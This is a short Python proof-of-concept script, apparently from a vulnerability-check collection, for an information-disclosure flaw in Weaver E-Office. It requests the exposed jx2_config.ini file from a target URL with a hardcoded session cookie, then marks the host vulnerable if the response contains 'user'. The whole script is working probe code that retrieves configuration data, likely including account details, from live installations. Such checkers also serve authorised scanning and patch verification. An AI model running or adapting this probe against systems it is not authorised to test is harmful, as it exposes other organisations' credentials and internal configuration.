import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微E-Office-jx2_config存在信息泄露漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Cookie': 'LOGIN_LANG=cn; PHPSESSID=265e1c6495a3bd40146196a1a42cd8dd',
        'Upgrade-Insecure-Requests': '1'
    }
    vurl = urllib.parse.urljoin(url, "/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini")
    try:
        response = requests.get(vurl, headers=headers, timeout=3)
        if response.status_code == 200 and 'user' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult